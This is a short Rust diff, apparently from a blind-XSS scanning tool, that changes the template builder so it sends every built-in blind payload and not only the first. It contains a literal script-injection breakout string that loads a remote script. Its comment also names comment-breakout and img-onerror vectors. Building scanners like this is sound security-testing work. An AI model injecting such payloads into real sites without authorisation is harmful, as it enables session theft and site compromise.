@@ -132,11 +132,20 @@ fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
             }
         }
     }
-    let template = crate::payload::XSS_BLIND_PAYLOADS
-        .first()
-        .copied()
-        .unwrap_or("\"'><script src={}></script>");
-    vec![template.to_string()]
+    // Send every built-in shape, not just the first. The catalog carries
+    // distinct breakout contexts (script-src, comment-then-script, and the
+    // `<img onerror>` DOM-sink vector), and only the first was ever reaching
+    // the wire — so the comment-breakout and innerHTML-compatible payloads were
+    // defined but never sent. Blind scanning is opt-in and low-volume, so the
+    // extra requests per param are a worthwhile trade for the added coverage.
+    let templates: Vec<String> = crate::payload::XSS_BLIND_PAYLOADS
+        .iter()
+        .map(|t| t.to_string())
+        .collect();
+    if templates.is_empty() {
+        return vec!["\"'><script src={}></script>".to_string()];
+    }
+    templates
 }
 
 /// Backward-compatible entry: inject a blind payload built from a single static
